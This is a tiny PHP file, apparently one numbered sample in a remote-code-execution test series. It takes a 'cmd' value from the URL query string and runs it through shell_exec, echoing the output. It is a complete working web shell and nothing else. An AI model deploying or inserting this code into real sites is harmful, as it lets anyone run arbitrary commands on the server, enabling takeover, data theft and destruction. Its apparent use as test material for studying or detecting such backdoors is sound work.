<?php
// RCE test variation #1449
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>